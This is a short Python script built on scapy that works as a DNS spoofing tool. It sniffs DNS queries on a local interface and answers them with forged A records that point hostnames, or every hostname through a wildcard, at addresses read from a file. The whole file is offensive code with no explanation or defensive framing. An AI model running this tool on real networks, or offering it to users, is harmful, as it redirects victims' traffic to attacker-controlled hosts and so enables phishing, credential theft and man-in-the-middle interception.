import sys 
from optparse import OptionParser
import scapy.all as scapy

dev=''
filter = 'udp port 53'
file = None
dns_map={}

def result(packet):
    dns = packet.getlayer(scapy.DNS)
    try:
        if dns.qr == 1 and dns.opcode == 0:
            print "\n\n\n"
            print dns.an.show()
    except AttributeError:
        pass

def handle_packet(packet):
    ip=packet.getlayer(scapy.IP)
    udp = packet.getlayer(scapy.UDP)
    dns = packet.getlayer(scapy.DNS)
    
    #DNS query
    if dns.qr == 0 and dns.opcode == 0:
        queried_host = dns.qd.qname[:-1]
        resolved_ip = None

        if dns_map.get(queried_host):
            resolved_ip = dns_map.get(queried_host)
        #No matter what's the host
        elif dns_map.get('*'):
            resolved_ip = dns_map.get('*')

        if resolved_ip:
            dns_answer = scapy.DNSRR(rrname=queried_host + ".",
                                     ttl = 330,
                                     type = "A",
                                     rclass="IN",
                                     rdata=resolved_ip)
            dns_reply = scapy.IP(src=ip.dst,dst=ip.src) /\
                        scapy.UDP(sport=udp.dport,
                                  dport=udp.sport)/ \
                        scapy.DNS(
                            id= dns.id,
                            qr=1,
                            aa=0,
                            rcode = 0,
                            qd=dns.qd,
                            an=dns_answer
                        )
            #if the destination is iface's ip function "send" will not work
            scapy.send(dns_reply,iface=dev)
            scapy.sniff(prn=result,iface=dev,filter=filter)

def parse_host_file(file):
    for line in open(file):
        line = line.rstrip('\n')
        
        if line:
            (ip,host) = line.split(' ')
            dns_map[host]=ip

usage = 'Usage:%prog -i interface -f host_file_path'
parser = OptionParser(usage)
parser.add_option('-i',dest="device")
parser.add_option('-f',dest='file')
(options,args) = parser.parse_args()

dev = options.device
file = options.file

if dev is None or file is None:
    parser.print_help()
    sys.exit(0)

parse_host_file(file)
scapy.sniff(iface=dev,filter=filter,prn=handle_packet)